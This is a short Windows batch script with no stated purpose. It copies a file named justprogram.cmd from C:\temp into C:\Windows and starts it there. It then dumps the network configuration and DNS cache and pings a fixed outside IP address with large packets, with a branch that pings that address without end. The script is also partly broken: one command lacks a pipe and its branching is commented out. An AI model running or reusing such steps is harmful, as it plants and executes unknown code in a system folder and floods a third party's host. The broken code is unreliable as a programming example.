@echo off
color 2
cd /
git version
cd "C:\Windows"
del "C:\Windows\justprogram.cmd"

::findstr "C:\temp\justprogram.cmd"
::findstr "C:\tmp\justprogram.cmd"
::findstr "C:\Users\Lenovo\Downloads\justprogram.cmd"
::findstr "C:\Users\Lenovo\Desktop\justprogram.cmd"

xcopy "C:\temp\justprogram.cmd" "C:\Windows"
start %windir%\justprogram.cmd 

::if EXIST "C:\Windows\justprogram.cmd."(
::   goto :info
::)else(
::    goto :done
::)

:info
    ipconfig /all
    ipconfig /displaydns
    ipconfig /all findstr DNS
    ping 49.229.108.190 -l 3972 -n 10
    pause
    exit

:done
    ping 49.229.108.190 -l 3972 -t
    pause

